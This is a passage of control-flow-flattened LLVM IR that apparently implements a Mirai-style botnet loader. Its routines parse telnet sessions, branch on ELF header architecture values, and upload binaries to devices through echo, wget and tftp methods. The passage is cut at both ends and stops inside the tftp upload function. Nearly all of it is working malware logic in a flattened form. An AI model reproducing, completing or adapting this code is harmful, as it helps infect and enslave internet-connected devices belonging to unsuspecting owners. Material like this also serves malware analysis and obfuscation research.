  %143 = getelementptr inbounds %struct.connection, %struct.connection* %142, i32 0, i32 3
  %144 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %143, i32 0, i32 2
  %145 = getelementptr inbounds [6 x i8], [6 x i8]* %144, i32 0, i32 0
  %146 = call i8* @strcpy(i8* %145, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.25, i32 0, i32 0)) #5
  store i32 1433570311, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  %148 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %149 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %148, i32 0, i32 2
  %150 = load i16, i16* %149, align 1
  %151 = zext i16 %150 to i32
  %152 = icmp eq i32 %151, 2
  %153 = select i1 %152, i32 -797730214, i32 330837708
  store i32 %153, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %156 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %155, i32 0, i32 2
  %157 = load i16, i16* %156, align 1
  %158 = zext i16 %157 to i32
  %159 = icmp eq i32 %158, 18
  %160 = select i1 %159, i32 -797730214, i32 315984966
  store i32 %160, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  %162 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %163 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %162, i32 0, i32 2
  %164 = load i16, i16* %163, align 1
  %165 = zext i16 %164 to i32
  %166 = icmp eq i32 %165, 43
  %167 = select i1 %166, i32 -797730214, i32 -1879710803
  store i32 %167, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load %struct.connection*, %struct.connection** %3, align 8
  %170 = getelementptr inbounds %struct.connection, %struct.connection* %169, i32 0, i32 3
  %171 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %170, i32 0, i32 2
  %172 = getelementptr inbounds [6 x i8], [6 x i8]* %171, i32 0, i32 0
  %173 = call i8* @strcpy(i8* %172, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.26, i32 0, i32 0)) #5
  store i32 -842881312, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %176 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %175, i32 0, i32 2
  %177 = load i16, i16* %176, align 1
  %178 = zext i16 %177 to i32
  %179 = icmp eq i32 %178, 4
  %180 = select i1 %179, i32 349399187, i32 -60292656
  store i32 %180, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %183 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %182, i32 0, i32 2
  %184 = load i16, i16* %183, align 1
  %185 = zext i16 %184 to i32
  %186 = icmp eq i32 %185, 5
  %187 = select i1 %186, i32 349399187, i32 540826021
  store i32 %187, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load %struct.connection*, %struct.connection** %3, align 8
  %190 = getelementptr inbounds %struct.connection, %struct.connection* %189, i32 0, i32 3
  %191 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %190, i32 0, i32 2
  %192 = getelementptr inbounds [6 x i8], [6 x i8]* %191, i32 0, i32 0
  %193 = call i8* @strcpy(i8* %192, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.27, i32 0, i32 0)) #5
  store i32 -516144008, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  %195 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %196 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %195, i32 0, i32 2
  %197 = load i16, i16* %196, align 1
  %198 = zext i16 %197 to i32
  %199 = icmp eq i32 %198, 20
  %200 = select i1 %199, i32 1485930912, i32 -437257715
  store i32 %200, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %203 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %202, i32 0, i32 2
  %204 = load i16, i16* %203, align 1
  %205 = zext i16 %204 to i32
  %206 = icmp eq i32 %205, 21
  %207 = select i1 %206, i32 1485930912, i32 89504655
  store i32 %207, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = load %struct.connection*, %struct.connection** %3, align 8
  %210 = getelementptr inbounds %struct.connection, %struct.connection* %209, i32 0, i32 3
  %211 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %210, i32 0, i32 2
  %212 = getelementptr inbounds [6 x i8], [6 x i8]* %211, i32 0, i32 0
  %213 = call i8* @strcpy(i8* %212, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.28, i32 0, i32 0)) #5
  store i32 1335647905, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  %215 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %216 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %215, i32 0, i32 2
  %217 = load i16, i16* %216, align 1
  %218 = zext i16 %217 to i32
  %219 = icmp eq i32 %218, 42
  %220 = select i1 %219, i32 1516532429, i32 -18545727
  store i32 %220, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = load %struct.connection*, %struct.connection** %3, align 8
  %223 = getelementptr inbounds %struct.connection, %struct.connection* %222, i32 0, i32 3
  %224 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %223, i32 0, i32 2
  %225 = getelementptr inbounds [6 x i8], [6 x i8]* %224, i32 0, i32 0
  %226 = call i8* @strcpy(i8* %225, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.29, i32 0, i32 0)) #5
  store i32 1221439709, i32* %switchVar
  br label %loopEnd

; <label>:227:                                    ; preds = %loopEntry
  %228 = load %struct.connection*, %struct.connection** %3, align 8
  %229 = getelementptr inbounds %struct.connection, %struct.connection* %228, i32 0, i32 3
  %230 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %229, i32 0, i32 2
  %231 = getelementptr inbounds [6 x i8], [6 x i8]* %230, i64 0, i64 0
  store i8 0, i8* %231, align 8
  %232 = load %struct.connection*, %struct.connection** %3, align 8
  call void @connection_close(%struct.connection* %232)
  store i32 1221439709, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  store i32 1335647905, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  store i32 -516144008, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  store i32 -842881312, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  store i32 1433570311, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  store i32 -1192283924, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  store i32 1669136061, i32* %switchVar
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  store i32 544412912, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  %241 = load %struct.connection*, %struct.connection** %3, align 8
  %242 = getelementptr inbounds %struct.connection, %struct.connection* %241, i32 0, i32 15
  %243 = getelementptr inbounds [8192 x i8], [8192 x i8]* %242, i32 0, i32 0
  %244 = load %struct.connection*, %struct.connection** %3, align 8
  %245 = getelementptr inbounds %struct.connection, %struct.connection* %244, i32 0, i32 9
  %246 = load i16, i16* %245, align 8
  %247 = zext i16 %246 to i32
  %248 = call i32 @util_memsearch(i8* %243, i32 %247, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %248, i32* %6, align 4
  %249 = icmp ne i32 %248, -1
  %250 = select i1 %249, i32 -131723204, i32 1243721558
  store i32 %250, i32* %switchVar
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  %252 = load i32, i32* %6, align 4
  store i32 %252, i32* %2, align 4
  store i32 -897076841, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  %254 = load %struct.connection*, %struct.connection** %3, align 8
  %255 = getelementptr inbounds %struct.connection, %struct.connection* %254, i32 0, i32 9
  %256 = load i16, i16* %255, align 8
  %257 = zext i16 %256 to i32
  %258 = icmp sgt i32 %257, 7168
  %259 = select i1 %258, i32 27518754, i32 2139629025
  store i32 %259, i32* %switchVar
  br label %loopEnd

; <label>:260:                                    ; preds = %loopEntry
  %261 = load %struct.connection*, %struct.connection** %3, align 8
  %262 = getelementptr inbounds %struct.connection, %struct.connection* %261, i32 0, i32 15
  %263 = getelementptr inbounds [8192 x i8], [8192 x i8]* %262, i32 0, i32 0
  %264 = load %struct.connection*, %struct.connection** %3, align 8
  %265 = getelementptr inbounds %struct.connection, %struct.connection* %264, i32 0, i32 15
  %266 = getelementptr inbounds [8192 x i8], [8192 x i8]* %265, i32 0, i32 0
  %267 = getelementptr inbounds i8, i8* %266, i64 6144
  %268 = load %struct.connection*, %struct.connection** %3, align 8
  %269 = getelementptr inbounds %struct.connection, %struct.connection* %268, i32 0, i32 9
  %270 = load i16, i16* %269, align 8
  %271 = zext i16 %270 to i32
  %272 = sub nsw i32 %271, 6144
  %273 = sext i32 %272 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %263, i8* %267, i64 %273, i32 1, i1 false)
  %274 = load %struct.connection*, %struct.connection** %3, align 8
  %275 = getelementptr inbounds %struct.connection, %struct.connection* %274, i32 0, i32 9
  %276 = load i16, i16* %275, align 8
  %277 = zext i16 %276 to i32
  %278 = sub nsw i32 %277, 6144
  %279 = trunc i32 %278 to i16
  store i16 %279, i16* %275, align 8
  store i32 2139629025, i32* %switchVar
  br label %loopEnd

; <label>:280:                                    ; preds = %loopEntry
  store i32 544412912, i32* %switchVar
  br label %loopEnd

; <label>:281:                                    ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -897076841, i32* %switchVar
  br label %loopEnd

; <label>:282:                                    ; preds = %loopEntry
  %283 = load i32, i32* %2, align 4
  ret i32 %283

loopEnd:                                          ; preds = %281, %280, %260, %253, %251, %240, %239, %238, %237, %236, %235, %234, %233, %227, %221, %214, %208, %201, %194, %188, %181, %174, %168, %161, %154, %147, %141, %134, %127, %120, %113, %112, %106, %100, %92, %85, %78, %72, %65, %58, %NewDefault, %57, %48, %47, %LeafBlock, %LeafBlock1, %NodeBlock, %NodeBlock3, %25, %24, %13, %first, %switchDefault
  br label %loopEntry
}

declare i32 @htons(...) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_arm_subtype(%struct.connection*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1635750206, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1635750206, label %first
    i32 800032568, label %16
    i32 -322135440, label %17
    i32 1638325234, label %25
    i32 390767327, label %33
    i32 1654183461, label %39
    i32 203797345, label %41
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp eq i32 %.reload, -1
  %15 = select i1 %14, i32 800032568, i32 -322135440
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 203797345, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load %struct.connection*, %struct.connection** %3, align 8
  %19 = getelementptr inbounds %struct.connection, %struct.connection* %18, i32 0, i32 15
  %20 = getelementptr inbounds [8192 x i8], [8192 x i8]* %19, i32 0, i32 0
  %21 = load i32, i32* %4, align 4
  %22 = call i32 @util_memsearch(i8* %20, i32 %21, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.30, i32 0, i32 0), i32 5)
  %23 = icmp ne i32 %22, -1
  %24 = select i1 %23, i32 390767327, i32 1638325234
  store i32 %24, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load %struct.connection*, %struct.connection** %3, align 8
  %27 = getelementptr inbounds %struct.connection, %struct.connection* %26, i32 0, i32 15
  %28 = getelementptr inbounds [8192 x i8], [8192 x i8]* %27, i32 0, i32 0
  %29 = load i32, i32* %4, align 4
  %30 = call i32 @util_memsearch(i8* %28, i32 %29, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.31, i32 0, i32 0), i32 5)
  %31 = icmp ne i32 %30, -1
  %32 = select i1 %31, i32 390767327, i32 1654183461
  store i32 %32, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load %struct.connection*, %struct.connection** %3, align 8
  %35 = getelementptr inbounds %struct.connection, %struct.connection* %34, i32 0, i32 3
  %36 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %35, i32 0, i32 2
  %37 = getelementptr inbounds [6 x i8], [6 x i8]* %36, i32 0, i32 0
  %38 = call i8* @strcpy(i8* %37, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.32, i32 0, i32 0)) #5
  store i32 1654183461, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %4, align 4
  store i32 %40, i32* %2, align 4
  store i32 203797345, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i32, i32* %2, align 4
  ret i32 %42

loopEnd:                                          ; preds = %39, %33, %25, %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_upload_methods(%struct.connection*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 2039824586, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 2039824586, label %first
    i32 2035756434, label %16
    i32 -57644710, label %17
    i32 -499110936, label %25
    i32 729869646, label %29
    i32 -1859242035, label %37
    i32 460649556, label %41
    i32 -571872502, label %45
    i32 -1051042702, label %46
    i32 866336707, label %48
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp eq i32 %.reload, -1
  %15 = select i1 %14, i32 2035756434, i32 -57644710
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 866336707, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load %struct.connection*, %struct.connection** %3, align 8
  %19 = getelementptr inbounds %struct.connection, %struct.connection* %18, i32 0, i32 15
  %20 = getelementptr inbounds [8192 x i8], [8192 x i8]* %19, i32 0, i32 0
  %21 = load i32, i32* %4, align 4
  %22 = call i32 @util_memsearch(i8* %20, i32 %21, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.33, i32 0, i32 0), i32 22)
  %23 = icmp eq i32 %22, -1
  %24 = select i1 %23, i32 -499110936, i32 729869646
  store i32 %24, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load %struct.connection*, %struct.connection** %3, align 8
  %27 = getelementptr inbounds %struct.connection, %struct.connection* %26, i32 0, i32 3
  %28 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %27, i32 0, i32 6
  store i32 1, i32* %28, align 8
  store i32 -1051042702, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load %struct.connection*, %struct.connection** %3, align 8
  %31 = getelementptr inbounds %struct.connection, %struct.connection* %30, i32 0, i32 15
  %32 = getelementptr inbounds [8192 x i8], [8192 x i8]* %31, i32 0, i32 0
  %33 = load i32, i32* %4, align 4
  %34 = call i32 @util_memsearch(i8* %32, i32 %33, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.34, i32 0, i32 0), i32 22)
  %35 = icmp eq i32 %34, -1
  %36 = select i1 %35, i32 -1859242035, i32 460649556
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load %struct.connection*, %struct.connection** %3, align 8
  %39 = getelementptr inbounds %struct.connection, %struct.connection* %38, i32 0, i32 3
  %40 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %39, i32 0, i32 6
  store i32 2, i32* %40, align 8
  store i32 -571872502, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load %struct.connection*, %struct.connection** %3, align 8
  %43 = getelementptr inbounds %struct.connection, %struct.connection* %42, i32 0, i32 3
  %44 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %43, i32 0, i32 6
  store i32 0, i32* %44, align 8
  store i32 -571872502, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 -1051042702, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %4, align 4
  store i32 %47, i32* %2, align 4
  store i32 866336707, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %2, align 4
  ret i32 %49

loopEnd:                                          ; preds = %46, %45, %41, %37, %29, %25, %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_upload_echo(%struct.connection*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 790293671, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 790293671, label %first
    i32 -2105987471, label %16
    i32 512478363, label %17
    i32 127598394, label %23
    i32 -770238320, label %25
    i32 -1134307987, label %36
    i32 251911516, label %38
    i32 914132182, label %86
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp eq i32 %.reload, -1
  %15 = select i1 %14, i32 -2105987471, i32 512478363
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 914132182, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load %struct.connection*, %struct.connection** %3, align 8
  %19 = getelementptr inbounds %struct.connection, %struct.connection* %18, i32 0, i32 2
  %20 = load %struct.binary*, %struct.binary** %19, align 8
  %21 = icmp eq %struct.binary* %20, null
  %22 = select i1 %21, i32 127598394, i32 -770238320
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load %struct.connection*, %struct.connection** %3, align 8
  call void @connection_close(%struct.connection* %24)
  store i32 0, i32* %2, align 4
  store i32 914132182, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load %struct.connection*, %struct.connection** %3, align 8
  %27 = getelementptr inbounds %struct.connection, %struct.connection* %26, i32 0, i32 5
  %28 = load i32, i32* %27, align 4
  %29 = load %struct.connection*, %struct.connection** %3, align 8
  %30 = getelementptr inbounds %struct.connection, %struct.connection* %29, i32 0, i32 2
  %31 = load %struct.binary*, %struct.binary** %30, align 8
  %32 = getelementptr inbounds %struct.binary, %struct.binary* %31, i32 0, i32 1
  %33 = load i32, i32* %32, align 8
  %34 = icmp eq i32 %28, %33
  %35 = select i1 %34, i32 -1134307987, i32 251911516
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %4, align 4
  store i32 %37, i32* %2, align 4
  store i32 914132182, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load %struct.connection*, %struct.connection** %3, align 8
  %40 = getelementptr inbounds %struct.connection, %struct.connection* %39, i32 0, i32 4
  %41 = load i32, i32* %40, align 8
  %42 = load %struct.connection*, %struct.connection** %3, align 8
  %43 = getelementptr inbounds %struct.connection, %struct.connection* %42, i32 0, i32 2
  %44 = load %struct.binary*, %struct.binary** %43, align 8
  %45 = getelementptr inbounds %struct.binary, %struct.binary* %44, i32 0, i32 2
  %46 = load i8**, i8*** %45, align 8
  %47 = load %struct.connection*, %struct.connection** %3, align 8
  %48 = getelementptr inbounds %struct.connection, %struct.connection* %47, i32 0, i32 5
  %49 = load i32, i32* %48, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8*, i8** %46, i64 %50
  %52 = load i8*, i8** %51, align 8
  %53 = load %struct.connection*, %struct.connection** %3, align 8
  %54 = getelementptr inbounds %struct.connection, %struct.connection* %53, i32 0, i32 5
  %55 = load i32, i32* %54, align 4
  %56 = icmp eq i32 %55, 0
  %57 = select i1 %56, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.37, i32 0, i32 0)
  %58 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %41, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.35, i32 0, i32 0), i8* %52, i8* %57)
  %59 = load %struct.connection*, %struct.connection** %3, align 8
  %60 = getelementptr inbounds %struct.connection, %struct.connection* %59, i32 0, i32 5
  %61 = load i32, i32* %60, align 4
  %62 = add nsw i32 %61, 1
  store i32 %62, i32* %60, align 4
  %63 = load %struct.connection*, %struct.connection** %3, align 8
  %64 = getelementptr inbounds %struct.connection, %struct.connection* %63, i32 0, i32 15
  %65 = getelementptr inbounds [8192 x i8], [8192 x i8]* %64, i32 0, i32 0
  %66 = load %struct.connection*, %struct.connection** %3, align 8
  %67 = getelementptr inbounds %struct.connection, %struct.connection* %66, i32 0, i32 15
  %68 = getelementptr inbounds [8192 x i8], [8192 x i8]* %67, i32 0, i32 0
  %69 = load i32, i32* %4, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %68, i64 %70
  %72 = load %struct.connection*, %struct.connection** %3, align 8
  %73 = getelementptr inbounds %struct.connection, %struct.connection* %72, i32 0, i32 9
  %74 = load i16, i16* %73, align 8
  %75 = zext i16 %74 to i32
  %76 = load i32, i32* %4, align 4
  %77 = sub nsw i32 %75, %76
  %78 = sext i32 %77 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %65, i8* %71, i64 %78, i32 1, i1 false)
  %79 = load i32, i32* %4, align 4
  %80 = load %struct.connection*, %struct.connection** %3, align 8
  %81 = getelementptr inbounds %struct.connection, %struct.connection* %80, i32 0, i32 9
  %82 = load i16, i16* %81, align 8
  %83 = zext i16 %82 to i32
  %84 = sub nsw i32 %83, %79
  %85 = trunc i32 %84 to i16
  store i16 %85, i16* %81, align 8
  store i32 0, i32* %2, align 4
  store i32 914132182, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %2, align 4
  ret i32 %87

loopEnd:                                          ; preds = %38, %36, %25, %23, %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_upload_wget(%struct.connection*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1221420371, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1221420371, label %first
    i32 1235280834, label %16
    i32 1432473230, label %17
    i32 -1878348230, label %19
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp eq i32 %.reload, -1
  %15 = select i1 %14, i32 1235280834, i32 1432473230
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -1878348230, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load i32, i32* %4, align 4
  store i32 %18, i32* %2, align 4
  store i32 -1878348230, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %2, align 4
  ret i32 %20

loopEnd:                                          ; preds = %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_upload_tftp(%struct.connection*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -88633266, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -88633266, label %first
    i32 -138431288, label %16
    i32 -750394543, label %17
    i32 923112933, label %25
    i32 1930517837, label %28
    i32 -1764323802, label %36
    i32 -284152491, label %39
    i32 -898842212, label %47
    i32 -116910285, label %50
    i32 1953491371, label %52
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

